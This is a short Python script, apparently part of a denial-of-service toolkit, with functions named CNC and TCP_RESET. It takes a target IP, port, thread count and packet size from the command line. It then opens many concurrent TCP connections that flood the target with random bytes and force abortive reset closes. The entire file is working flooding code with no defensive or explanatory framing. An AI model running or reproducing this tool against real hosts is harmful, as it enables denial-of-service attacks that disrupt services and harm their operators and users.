import socket,struct,threading,sys,os
from MODEL.data import read

def TCP_RESET(s,size):
  try:
   for _ in range(250):
     if read() == True:break
     s.sendall(os.urandom(size)); s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
   s.shutdown(socket.SHUT_RDWR); s.close()
  except:pass

def CNC(addr,size):
  try:
     for _ in range(250):
      if read() == True:break
      s = socket.create_connection(addr)
      threading.Thread(target=TCP_RESET,args=(s,size)).start()
  except Exception as e:print(e)

ip,port,thread,size = sys.argv[1], int(sys.argv[2]),int(sys.argv[3]),int(sys.argv[4])
[threading.Thread(target=CNC,args=((ip,port),size)).start() for _ in range(thread)]
